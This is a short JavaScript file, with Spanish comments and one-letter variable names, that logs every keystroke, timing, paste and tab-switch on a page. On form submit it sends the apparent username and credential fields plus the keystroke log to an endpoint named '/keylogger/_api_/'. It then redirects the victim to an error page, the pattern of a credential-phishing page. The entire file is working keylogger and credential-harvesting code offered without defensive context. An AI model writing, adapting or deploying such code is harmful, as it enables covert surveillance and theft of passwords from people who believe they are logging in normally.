let t = ''; // teclas presionadas
let s = Date.now(); // startTime
let b = 0; // backspaceCount
let v = 0; // visibilityChanges
let p = false; // pasted
let l = null; // lastKeyTime
let d = []; // delays

document.addEventListener('keydown', e => {
    if (e.key.length === 1) t += e.key;
    if (e.key === 'Backspace') b++;
    const n = Date.now();
    if (l) d.push(n - l);
    l = n;
});

document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'hidden' || document.visibilityState === 'visible') {
        v++;
    }
});

document.querySelector('[name="c"]').addEventListener('paste', () => {
    p = true;
});

document.getElementById('f').addEventListener('submit', function(e) {
    e.preventDefault();
    const form = new FormData(this);
    const eT = Date.now() - s;

    fetch('/keylogger/_api_/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            u: form.get('u') || '',
            c: form.get('c') || '',
            t: t,
            tt: eT,
            b: b,
            vc: v,
            pc: p,
            kd: d
        })
    }).then(() => {
        window.location.href = 'error_page.html';
    });
});
